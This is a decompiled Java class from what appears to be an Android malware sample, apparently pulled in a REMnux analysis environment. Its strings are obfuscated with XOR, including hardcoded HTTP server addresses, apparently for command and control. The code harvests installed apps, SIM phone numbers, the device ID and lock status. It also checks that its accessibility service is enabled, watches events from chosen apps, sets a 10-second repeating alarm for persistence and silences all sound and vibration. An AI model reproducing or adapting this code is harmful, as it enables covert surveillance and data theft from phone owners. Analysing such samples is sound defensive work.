package com.zjxyxnvvp.nxvxchltf.util;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.media.AudioManager;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import b.a.a.a.f.d;
import b.a.a.a.g.c;
import com.zjxyxnvvp.nxvxchltf.i.q;
import com.zjxyxnvvp.nxvxchltf.receiver.eifbiaFBAUIFB;
import java.net.InetAddress;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class b {

    /* renamed from: a */
    public static Set<String> f361a;
    private static String d;
    private static short[] $ = {355, 380, 359, 352, 358, 7531, 7536, 7543, 7536, 7533, 7530, 7551, 7538, 7538, 7547, 7532, 841, 863, 857, 847, 840, 851, 846, 835, 1642, 1637, 1644, 1640, 1639, 1644, 1659, 802, 830, 830, 826, 880, 869, 869, 891, 882, 895, 868, 888, 891, 895, 868, 891, 891, 889, 868, 889, 891, 880, 882, 895, 869, 811, 826, 803, 869, 799, 771, 771, 775, 845, 856, 856, 846, 838, 857, 837, 838, 834, 857, 847, 834, 857, 834, 834, 845, 847, 834, 856, 790, 775, 798, 856, 5587, 5596, 5590, 5568, 5597, 5595, 5590, 5532, 5572, 5595, 5591, 5573, 5532, 5572, 5595, 5591, 5573, 1893, 1902, 1900, 1888, 1896, 1903, 1906, 6859, 6891, 7928, 7927, 7933, 7915, 7926, 7920, 7933, 7863, 7920, 7927, 7917, 7932, 7927, 7917, 7863, 7928, 7930, 7917, 7920, 7926, 7927, 7863, 7899, 7896, 7885, 7885, 7900, 7883, 7872, 7878, 7898, 7889, 7896, 7895, 7902, 7900, 7901, 726, 727, 716, 664, 712, 727, 715, 715, 721, 730, 724, 733, 8903, 8910, 8925, 8910, 8903, 3532, 3548, 3550, 3539, 3546, 4863, 4839, 4832, 4833, 4842, 6420, 6415, 6410, 6415, 6414, 6422, 6415, 2488, 7859, 7868, 7862, 7840, 7869, 7867, 7862, 7821, 7867, 7862, 9106, 9091, 9089, 9097, 9091, 9093, 9095, 5678, 5665, 5675, 5693, 5664, 5670, 5675, 5729, 5695, 5674, 5693, 5666, 5670, 5692, 5692, 5670, 5664, 5665, 5729, 5661, 5642, 5646, 5643, 5648, 5663, 5639, 5632, 5633, 5642, 5648, 5660, 5659, 5646, 5659, 5642, 8618, 3705, 3704, 3639, 3687, 3711, 3704, 3705, 3698, 1018, 1019, 948, 999, 993, 1014, 948, 1017, 1013, 1018, 1013, 1011, 1009, 998, 4386, 4387, 4460, 4412, 4393, 4414, 4385, 4389, 4415, 4415, 4389, 4387, 4386, 8567, 8572, 8563, 8560, 8574, 8567, 8566, 8525, 8563, 8561, 8561, 8567, 8545, 8545, 8571, 8560, 8571, 8574, 8571, 8550, 8555, 8525, 8545, 8567, 8544, 8548, 8571, 8561, 8567, 8545, 6929, 6958, 6961, 6953, 6971, 6956, 3457, 3465, 3465, 3457, 3466, 3459, 3528, 3461, 3465, 3467, 1268, 1274, 1254, 1272, 1258, 1278, 1261, 1275, 9919, 9905, 9901, 9907, 9889, 9909, 9894, 9904, 6581, 6585, 6587, 6648, 6583, 6584, 6578, 6564, 6585, 6591, 6578, 6648, 6560, 6579, 6584, 6578, 6591, 6584, 6577, 5218, 5230, 5228, 5167, 5225, 5236, 5216, 5238, 5220, 5224, 5167, 5216, 5233, 5233, 5228, 5216, 5235, 5226, 5220, 5237, 2220, 2208, 2210, 2273, 2236, 2218, 2220, 2273, 2222, 2209, 2219, 2237, 2208, 2214, 2219, 2273, 2222, 2239, 2239, 2273, 2236, 2222, 2210, 2236, 2234, 2209, 2216, 2222, 2239, 2239, 2236, 1707, 1702, 1707, 1720, 1703, 8501, 8481, 8496, 8509, 8507, 3565, 3558, 3563, 3565, 3557, 3476, 3470, 3582, 3522, 3535, 3543, 3470, 3550, 3548, 3521, 3546, 3531, 3533, 3546, 3527, 3521, 3520, 3470, 3546, 3535, 3549, 3525, 3470, 3528, 3535, 3527, 3522, 3531, 3530, 3485, 6349, 6347, 6361, 6350, 6344, 6341, 6345, 6357, 6355, 6348, 6365, 6351, 6360, 6362, 6363, 6356, 6358, 6359, 6352, 6342, 6340, 6367, 6346, 6366, 6354, 6353, 6285, 6286, 6287, 6280, 6281, 6282, 6283, 6276, 6277, 6284};

    /* renamed from: b */
    private static final String[] f362b = {$(31, 60, 842), $(60, 87, 887)};
    private static int c = 0;

    /* JADX INFO: Access modifiers changed from: package-private */
    /* loaded from: /home/remnux/decompressedMalicious.dex */
    public class a implements b.a.a.a.g.a<d.a> {
        private static short[] $ = {1533, 1526, 1531, 1533, 1525, 1420, 1412, 1438, 1518, 1490, 1503, 1479, 1438, 1486, 1484, 1489, 1482, 1499, 1501, 1482, 1495, 1489, 1488, 1438, 1499, 1488, 1503, 1500, 1490, 1499, 1498, 8854, 8861, 8848, 8854, 8862, 8935, 8943, 8949, 8837, 8889, 8884, 8876, 8949, 8869, 8871, 8890, 8865, 8880, 8886, 8865, 8892, 8890, 8891, 8949, 8881, 8892, 8870, 8884, 8887, 8889, 8880, 8881, 8562, 8569, 8564, 8562, 8570, 8451, 8459, 8465, 8545, 8541, 8528, 8520, 8465, 8513, 8515, 8542, 8517, 8532, 8530, 8517, 8536, 8542, 8543, 8465, 8517, 8528, 8514, 8538, 8465, 8535, 8528, 8536, 8541, 8532, 8533, 8448, 3733, 3742, 3731, 3733, 3741, 3812, 3820, 3830, 3718, 3770, 3767, 3759, 3830, 3750, 3748, 3769, 3746, 3763, 3765, 3746, 3775, 3769, 3768, 3830, 3746, 3767, 3749, 3773, 3830, 3760, 3767, 3775, 3770, 3763, 3762, 3812};

        private static String $(int i, int i2, int i3) {
            char[] cArr = new char[i2 - i];
            for (int i4 = 0; i4 < i2 - i; i4++) {
                cArr[i4] = (char) ($[i + i4] ^ i3);
            }
            return new String(cArr);
        }

        a() {
        }

        @Override // b.a.a.a.g.a
        public void a(c<d.a> cVar) {
            String $2;
            try {
                if (!cVar.c()) {
                    q.f330a = true;
                    q.c = q.b.f333a;
                    $2 = $(63, 99, 8497);
                } else if (cVar.b().c()) {
                    q.f330a = false;
                    q.c = q.b.f333a;
                    $2 = $(0, 31, 1470);
                } else {
                    q.f330a = true;
                    q.c = q.b.f333a;
                    $2 = $(31, 63, 8917);
                }
                e.a($2);
            } catch (Exception e) {
                e.printStackTrace();
                q.f330a = true;
                q.c = q.b.f333a;
                e.a($(99, 135, 3798));
            }
        }
    }

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    static {
        HashSet hashSet = new HashSet();
        f361a = hashSet;
        hashSet.add($(0, 5, 277));
        f361a.add($(5, 16, 7454));
        f361a.add($(16, 24, 826));
        f361a.add($(24, 31, 1545));
    }

    private static String a(String str) {
        if (str == null || str.length() == 0) {
            return "";
        }
        char charAt = str.charAt(0);
        if (Character.isUpperCase(charAt)) {
            return str;
        }
        return Character.toUpperCase(charAt) + str.substring(1);
    }

    public static List<AccessibilityNodeInfo> b(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String lowerCase = str.toLowerCase();
        ArrayList arrayList = new ArrayList();
        if (accessibilityNodeInfo == null) {
            return arrayList;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                if (child.getClassName() == null || !child.getClassName().toString().toLowerCase().contains(lowerCase)) {
                    arrayList.addAll(b(child, str));
                } else {
                    arrayList.add(child);
                }
            }
        }
        return arrayList;
    }

    public static List<AccessibilityNodeInfo> c(AccessibilityNodeInfo accessibilityNodeInfo) {
        ArrayList arrayList = new ArrayList();
        if (accessibilityNodeInfo == null) {
            return arrayList;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                if (child.getChildCount() == 0) {
                    arrayList.add(child);
                } else {
                    arrayList.addAll(c(child));
                }
            }
        }
        return arrayList;
    }

    public static List<AccessibilityNodeInfo> d(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> c2 = c(accessibilityNodeInfo);
        ArrayList arrayList = new ArrayList();
        for (AccessibilityNodeInfo accessibilityNodeInfo2 : c2) {
            if (!(accessibilityNodeInfo2 == null || accessibilityNodeInfo2.getClassName() == null || !accessibilityNodeInfo2.getClassName().toString().toLowerCase().equals($(87, 104, 5554)) || accessibilityNodeInfo2.getText() == null)) {
                arrayList.add(accessibilityNodeInfo2);
            }
        }
        return arrayList;
    }

    public static String e(Context context, com.zjxyxnvvp.nxvxchltf.d dVar, String str) {
        String[] f = f(context, dVar);
        if (c >= f.length) {
            c = 0;
        }
        return f[c] + str;
    }

    private static String[] f(Context context, com.zjxyxnvvp.nxvxchltf.d dVar) {
        String e = dVar.f314a.e(context, $(104, 111, 1793));
        if (e == null) {
            return f362b;
        }
        String[] split = e.split($(111, 113, 6807));
        int length = split.length;
        String[] strArr = f362b;
        String[] strArr2 = new String[length + strArr.length];
        System.arraycopy(strArr, 0, strArr2, 0, strArr.length);
        System.arraycopy(split, 0, strArr2, f362b.length, split.length);
        return strArr2;
    }

    public static String g(Context context) {
        Intent registerReceiver = context.registerReceiver(null, new IntentFilter($(113, 150, 7833)));
        if (registerReceiver == null) {
            return $(150, 162, 696);
        }
        return String.valueOf(Math.round((((float) registerReceiver.getIntExtra($(162, 167, 8875), -1)) / ((float) registerReceiver.getIntExtra($(167, 172, 3519), -1))) * 100.0f));
    }

    public static String h(Context context) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService($(172, 177, 4751));
        return telephonyManager.getNetworkCountryIso().isEmpty() ? $(177, 184, 6497) : telephonyManager.getNetworkCountryIso();
    }

    public static String i() {
        String str = Build.MANUFACTURER;
        String str2 = Build.MODEL;
        if (str2.toLowerCase().startsWith(str.toLowerCase())) {
            return a(str2);
        }
        return a(str) + $(184, 185, 2456) + str2;
    }

    public static String j(Context context) {
        String string = Settings.Secure.getString(context.getContentResolver(), $(185, 195, 7890));
        return (string == null || string.equals("")) ? x(24) : string;
    }

    public static void k(Context context, JSONArray jSONArray) {
        JSONException e;
        int i = 0;
        for (ApplicationInfo applicationInfo : context.getPackageManager().getInstalledApplications(128)) {
            if (context.getPackageManager().getLaunchIntentForPackage(applicationInfo.packageName) != null) {
                try {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put($(195, 202, 9186), applicationInfo.packageName);
                    i++;
                    try {
                        jSONArray.put(i, jSONObject);
                    } catch (JSONException e2) {
                        e = e2;
                        e.printStackTrace();
                    }
                } catch (JSONException e3) {
                    e = e3;
                    i = i;
                }
            }
        }
    }

    public static String l(Context context) {
        String str = d;
        if (str != null) {
            return str;
        }
        try {
            String str2 = (String) context.getPackageManager().getApplicationLabel(context.getPackageManager().getApplicationInfo(context.getPackageName(), 128));
            d = str2;
            return str2;
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    @SuppressLint({"HardwareIds"})
    public static String m(Context context) {
        if (context.checkCallingOrSelfPermission($(202, 237, 5711)) != 0) {
            return $(260, 273, 4428);
        }
        SubscriptionManager from = SubscriptionManager.from(context);
        if (from == null) {
            return $(246, 260, 916);
        }
        List<SubscriptionInfo> activeSubscriptionInfoList = from.getActiveSubscriptionInfoList();
        if (activeSubscriptionInfoList == null) {
            return $(238, 246, 3607);
        }
        StringBuilder sb = new StringBuilder();
        for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
            sb.append(subscriptionInfo.getNumber());
            sb.append($(237, 238, 8592));
        }
        return sb.toString();
    }

    public static boolean n(Context context, Class<?> cls) {
        ComponentName componentName;
        String string;
        try {
            componentName = new ComponentName(context, cls);
            string = Settings.Secure.getString(context.getContentResolver(), $(273, 303, 8466));
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (string == null) {
            return false;
        }
        for (String str : string.split($(303, 304, 6955))) {
            ComponentName unflattenFromString = ComponentName.unflattenFromString(str);
            if (unflattenFromString != null && unflattenFromString.equals(componentName)) {
                return true;
            }
        }
        return false;
    }

    public static boolean o(Context context) {
        return ((PowerManager) context.getSystemService($(304, 309, 7006))).isIgnoringBatteryOptimizations(context.getPackageName());
    }

    public static boolean p() {
        try {
            return !InetAddress.getByName($(309, 319, 3558)).equals("");
        } catch (Exception unused) {
            return false;
        }
    }

    public static boolean q(Context context) {
        return ((KeyguardManager) context.getSystemService($(319, 327, 1183))).isKeyguardLocked();
    }

    public static boolean r(Context context) {
        return ((KeyguardManager) context.getSystemService($(327, 335, 9940))).isDeviceSecure();
    }

    public static boolean s(AccessibilityEvent accessibilityEvent) {
        CharSequence packageName = accessibilityEvent.getPackageName();
        if (packageName == null) {
            return false;
        }
        return packageName.equals($(335, 354, 6614)) || packageName.equals($(354, 374, 5121)) || packageName.equals($(374, 405, 2255));
    }

    @SuppressLint({"ShortAlarm"})
    public static void t(Context context) {
        try {
            PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(context, eifbiaFBAUIFB.class), 0);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService($(405, 410, 1738));
            alarmManager.setRepeating(0, System.currentTimeMillis() + 10000, 10000, broadcast);
            alarmManager.setExactAndAllowWhileIdle(0, System.currentTimeMillis() + 10000, broadcast);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String u() {
        return Locale.getDefault().toString().toLowerCase();
    }

    public static void v(Context context) {
        try {
            AudioManager audioManager = (AudioManager) context.getSystemService($(410, 415, 8532));
            audioManager.setStreamMute(1, true);
            audioManager.setStreamMute(3, true);
            audioManager.setStreamVolume(4, 0, 0);
            audioManager.setStreamVolume(8, 0, 0);
            audioManager.setStreamVolume(5, 0, 0);
            audioManager.setStreamVolume(2, 0, 0);
            audioManager.setStreamVolume(1, 0, 0);
            audioManager.setVibrateSetting(1, 0);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void w(Context context) {
        try {
            b.a.a.a.f.c.a(context).i().a(new a());
        } catch (Exception e) {
            e.printStackTrace();
            q.f330a = true;
            q.c = q.b.f333a;
            e.a($(415, 450, 3502));
        }
    }

    public static String x(int i) {
        SecureRandom secureRandom = new SecureRandom();
        StringBuilder sb = new StringBuilder();
        for (int i2 = 0; i2 < i; i2++) {
            sb.append($(450, 486, 6332).charAt(secureRandom.nextInt(36)));
        }
        return sb.toString();
    }

    public static void y() {
        c++;
    }
}
